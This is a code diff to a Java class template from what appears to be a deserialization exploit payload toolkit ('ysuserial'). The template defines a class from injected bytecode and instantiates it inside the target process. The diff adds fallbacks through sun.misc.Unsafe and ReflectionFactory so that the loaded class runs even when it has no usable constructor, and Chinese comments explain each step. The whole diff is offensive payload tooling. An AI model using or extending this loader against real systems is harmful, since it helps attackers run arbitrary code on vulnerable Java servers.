@@ -1,7 +1,10 @@
 package org.su18.ysuserial.payloads.templates;
 
+import sun.reflect.ReflectionFactory;
+
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
+import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.lang.reflect.Proxy;
@@ -32,13 +35,24 @@ public class ClassLoaderTemplate {
 			method.setAccessible(true);
 			Class invoke = (Class) method.invoke(null, classLoader, className, bytes, 0, bytes.length);
 			try {
+				// 先尝试 newInstance
 				invoke.newInstance();
 			} catch (Exception ignored) {
-				Class unsafe         = Class.forName("sun.misc.Unsafe");
-				Field theUnsafeField = unsafe.getDeclaredField("theUnsafe");
-				theUnsafeField.setAccessible(true);
-				Object unsafeObject = theUnsafeField.get(null);
-				unsafeObject.getClass().getDeclaredMethod("allocateInstance", Class.class).invoke(unsafeObject, invoke);
+				try {
+					// 如果没有无参构造方法，会报错，这里可以使用 Unsafe 创建，个人非常喜欢 Unsafe 这个类，无拘无束，自由自在
+					Class unsafe         = Class.forName("sun.misc.Unsafe");
+					Field theUnsafeField = unsafe.getDeclaredField("theUnsafe");
+					theUnsafeField.setAccessible(true);
+					Object unsafeObject = theUnsafeField.get(null);
+					unsafeObject.getClass().getDeclaredMethod("allocateInstance", Class.class).invoke(unsafeObject, invoke);
+				} catch (Exception neverMind) {
+					// 如果没有 Unsafe，可以使用反射库中的方法，为 Class 创建一个
+					Constructor objCons = invoke.getDeclaredConstructor(new Class[0]);
+					objCons.setAccessible(true);
+					Constructor sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(invoke, objCons);
+					sc.setAccessible(true);
+					sc.newInstance(new Object[0]);
+				}
 			}
 		} catch (Exception ignored) {
 		}
